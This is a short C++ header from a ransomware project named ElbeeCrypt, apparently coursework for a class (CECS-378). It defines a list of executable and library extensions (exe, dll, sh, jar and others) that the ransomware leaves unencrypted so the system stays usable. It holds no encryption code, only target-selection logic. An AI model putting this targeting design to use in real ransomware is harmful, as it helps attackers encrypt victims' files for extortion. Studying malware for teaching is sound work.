#pragma once

#include "einstein-enum/einstein-enum.hpp"

namespace elbeecrypt::common::targets::extgroup {
	/** 
	 * Represents extensions that are primarily used for executable 
	 * files and dynamic libraries, eg: exe, dll, com, dylib. Generally, 
	 * these files should not be encrypted, as doing so can cause 
	 * the system to go haywire. The goal of this ransomware is not 
	 * to completely disable the system (ElbeeCrypt isn't as evil as 
	 * Petya). However, it's important to disclose  these file types
	 * in a scenario where the ransomware may operate in a sort of 
	 * whitelist mode, where it encrypts any file that doesn't carry 
	 * a certain extension.
	 * 
	 * @author CECS-378 Group 10
	 * @file executable.hpp
	 */
	einstein_enum(Executable,
		bat,
		com,
		cmd,
		dll,
		dylib,
		elf,
		exe,
		jar,
		phar,
		sh,
		so,
		war
	)
}